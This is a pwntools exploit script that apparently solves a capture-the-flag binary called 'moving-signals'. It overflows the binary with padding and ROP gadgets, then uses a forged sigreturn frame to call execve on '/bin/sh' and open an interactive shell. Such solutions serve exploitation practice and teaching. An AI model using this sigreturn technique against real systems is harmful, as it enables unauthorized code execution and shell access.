from pwn import *

file = "./moving-signals"
e = ELF(file)
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

io = process(file)

addr_binsh = 0x0041250
rop_syscall_ret = 0x0041015
rop_rax_ret = 0x0041018

frame = SigreturnFrame(arch = 'amd64')
frame.rax = 59 #execv
frame.rdi = addr_binsh
frame.rsi = 0
frame.rdx = 0
frame.rsp = 0x41000
frame.rip = rop_syscall_ret

pld = b"A" * 8
pld += p64(rop_rax_ret)
pld += p64(0xf) #sigreturn
pld += p64(rop_syscall_ret)
pld += bytes(frame)

io.sendline(pld)

io.interactive()
